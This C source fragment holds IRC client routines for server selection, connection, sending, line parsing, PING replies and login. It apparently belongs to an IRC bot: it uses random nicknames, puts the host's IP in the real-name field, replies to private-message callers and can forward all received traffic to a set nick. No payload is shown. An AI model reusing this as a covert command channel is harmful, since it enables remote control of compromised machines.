
// common subroutines, used to work with IRC server

void irc_select_random_server()
{
  int i = rnd(irc_serv_count);
  irc_server_name = irc_serv_list[i].hostname;
  log2("$$$ trying %s\n", irc_server_name);
  hostent *h = gethostbyname(irc_server_name);
  if (!h)
  {
    irc_error = WSAGetLastError();
    log2("gethostbyname() error %i\n", irc_error);
    return;
  }
  irc_server_ip = *(DWORD*)h->h_addr_list[0];
  irc_server_port = rndR(irc_serv_list[i].port_min,
                         irc_serv_list[i].port_max);
  log4("--> host='%s' ip=%s port=%i\n", h->h_name, IP2STR(irc_server_ip), irc_server_port);
}

void irc_connect()
{
  log1("þ connect\n");

  irc_select_random_server();
  if (irc_error) return;

  struct sockaddr_in addr = {AF_INET};
  addr.sin_port   = htons(irc_server_port);
  addr.sin_addr.s_addr = irc_server_ip;

  if (connect(irc_socket, (sockaddr*)&addr, sizeof(sockaddr)) == SOCKET_ERROR)
  {
    irc_count_badconnect++;
    irc_error = WSAGetLastError();
    log2("connect() error %i\n", irc_error);
    return;
  }

  irc_count_goodconnect++;
  online_mode++;
}

// send string to IRC server
void cdecl irc_send(char* format, ...)
{
  char irc_sendstr[1024];

  va_list ap;
  va_start(ap, format);
  vsprintf(irc_sendstr, format, ap);
  va_end(ap);

  log2("send: %s", irc_sendstr);

  for (;;)
  {
    if ( send(irc_socket, irc_sendstr, strlen(irc_sendstr), 0) != SOCKET_ERROR ) break;

    int err = WSAGetLastError();
    if (err != WSAEWOULDBLOCK)
    {
      log2("send() error %i\n", err);
      irc_error = err;
      return;
    }
  }
}

// reply to PRIVMSG
void cdecl irc_reply(char* format, ...)
{
  if (!irc_caller[0]) return;

  char irc_sendstr[1024];

  sprintf(irc_sendstr, "PRIVMSG %s :", irc_caller);

  va_list ap;
  va_start(ap, format);
  vsprintf(strchr(irc_sendstr,0), format, ap);
  va_end(ap);

  irc_send(irc_sendstr);
}

// - receive SINGLE asciiz-string from IRC server
//   (because recv() buffer can contain multiple lines)
// - answere to server PING message (PONG)
// - result in irc_recvstr variable

void irc_recvline()
{
  for (;;)
  {
    int res;
    for (;;)
    {
      res = recv(irc_socket, irc_recvstr, IRCRECVSIZE, MSG_PEEK);
      if ((res != 0) && (res != SOCKET_ERROR)) break;
      int err = WSAGetLastError();
      if (res == 0) err = 1;
      if (err != WSAEWOULDBLOCK)
      {
        log2("recv() error %i\n", err);
        irc_error = err;
        return;
      }
    }

    char *c = strchr(irc_recvstr, '\n');
    if (c) c++;
    if ((!c) && (res >= IRCRECVSIZE)) c = irc_recvstr + IRCRECVSIZE;

    if (c)
    {
      recv(irc_socket, irc_recvstr, c-irc_recvstr, 0);
      *c = 0;

      c = irc_recvstr; while (*c++) if ((*c==13)||(*c==10)) *c=0;

      log2("recv: %s\n", irc_recvstr);

      for (int i=0; i<(int)strlen(irc_recvstr); i++)
        randomize(irc_recvstr[i]);

      irc_parse();

//    if (*(DWORD*)&irc_recvstr == 'PING')
      if (!stricmp(strv[0], "PING"))
      {
        irc_send("PONG %s\n", strv[1]+1);       // skip ':'
        if (irc_error) return;
        continue;
      }

      if (irc_forward[0] != 0)  // forward
      {
        char t[1024];
        strcpy(t, irc_recvstr);
        strkillpsw(t);                          // replace passwords with '*'
        irc_send("PRIVMSG %s :-->%s\n", irc_forward, t);
      }

      return;           // return irc_recvstr
    }

  } // for -- something received
} // irc_recvline

// change nick
void irc_setnick(char* newnick)
{
  if ((!newnick) || (!newnick[0]))
    mkrndstr(1,irc_user_nick);
  else
    strcpy(irc_user_nick, newnick);
  irc_send("NICK %s\n", irc_user_nick);
}

void irc_login_sendinfo()
{
  irc_setnick(0);

  mkrndstr(0,irc_user_name);
  mkrndstr(0,irc_user_host);
  mkrndstr(0,irc_user_server);
  strcpy(irc_user_realname, host2real(irc_local_ip_str));

  irc_send("USER %s \"%s\" \"%s\" :%s\n",
    irc_user_name,
    irc_user_host,
    irc_user_server,
    irc_user_realname);
} // irc_login_sendinfo

// login to IRC server
void irc_login()
{
  log1("þ login\n");

  irc_login_sendinfo();

  for (;;)
  {
    irc_recvline();
    if (irc_error) return;

    if ( (irc_rpl==ERR_NICKNAMEINUSE) ||
         (irc_rpl==ERR_NICKCOLLISION) ||
         (irc_rpl==ERR_ERRONEUSNICKNAME)  )
    {
      irc_setnick(0);
      if (irc_error) return;
    }

    if (irc_rpl==ERR_YOUREBANNEDCREEP)
    {
      irc_error++;
      return;
    }

    if (irc_rpl==RPL_ENDOFMOTD) break;

  } // wait until we're logged in

  logged_mode++;

} // irc_login
